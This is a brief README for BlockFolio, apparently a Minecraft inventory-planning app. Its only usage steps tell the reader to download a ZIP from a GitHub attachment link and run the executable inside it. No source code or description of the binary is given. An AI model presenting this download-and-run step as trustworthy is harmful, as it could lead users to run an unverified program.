# BlockFolio
📦 BlockFolio (English Version)
BlockFolio is a utility tool for Minecraft players, designed to help organize items and resources using an intuitive Drag & Drop interface.

✨ Features
Web-based UI: A clean interface built with HTML/CSS, running as a standalone desktop application.

Drag & Drop: Easily move items between slots to plan your inventory.

Portable: No complex installation required. Just extract and run.

🚀 How to Run
To start using the application:

Download the BlockFolio.zip file.

Extract the contents of the ZIP file.
[BlockFolio.zip](https://github.com/user-attachments/files/27491880/BlockFolio.zip)

Open the folder and locate the executable file named BlockFolio.

Run the file to launch the application.
